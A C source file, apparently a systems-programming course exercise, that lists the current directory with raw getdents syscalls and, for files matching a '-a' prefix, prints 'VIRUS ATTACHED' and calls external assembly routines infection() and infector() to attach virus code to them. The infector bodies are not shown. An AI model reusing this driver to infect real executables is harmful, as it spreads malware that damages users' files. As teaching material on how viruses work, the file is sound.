#include "util.h"

#define SYS_WRITE 4
#define STDOUT 1
#define SYS_OPEN 5
#define O_RDWR 2
#define SYS_SEEK 19
#define SEEK_SET 0
#define SHIRA_OFFSET 0x291

/* Getdents definitions */
#define SYS_GETDENTS 141

struct linux_dirent {
   unsigned long  d_ino;
   unsigned long  d_off;
   unsigned short d_reclen;
   char           d_name[];
};

extern int system_call();
extern void infection();
extern void infector(char *);
extern void code_start();
extern void code_end();

int main (int argc , char* argv[], char* envp[])
{
  int fd;
  int nread;
  char buf[8192];
  struct linux_dirent *d;
  int bpos;
  char d_type;
  char *prefix = 0;
  int i;
  
  /* Check for -a prefix flag */
  for (i = 1; i < argc; i++) {
      if (argv[i][0] == '-' && argv[i][1] == 'a') {
          prefix = argv[i] + 2;
      }
  }

  /* Open current directory */
  fd = system_call(SYS_OPEN, ".", 0 /* O_RDONLY */, 0);
  if (fd < 0) {
      system_call(1, 0x55); /* exit with 0x55 on error */
  }

  nread = system_call(SYS_GETDENTS, fd, buf, 8192);
  if (nread == -1) {
       system_call(1, 0x55);
  }

  for (bpos = 0; bpos < nread;) {
      d = (struct linux_dirent *) (buf + bpos);
      d_type = *(buf + bpos + d->d_reclen - 1);
      
      /* Print file name */
      /* Filter logic if prefix is set */
      if (prefix) {
           if (strncmp(d->d_name, prefix, strlen(prefix)) == 0) {
               system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
               system_call(SYS_WRITE, STDOUT, " VIRUS ATTACHED\n", 16);
               
               /* Call assembly functions to attach virus */
               infection();
               infector(d->d_name);
           } else {
               system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
               system_call(SYS_WRITE, STDOUT, "\n", 1);
           }
      } else {
          system_call(SYS_WRITE, STDOUT, d->d_name, strlen(d->d_name));
          system_call(SYS_WRITE, STDOUT, "\n", 1);
      }

      bpos += d->d_reclen;
  }
  
  return 0;
}
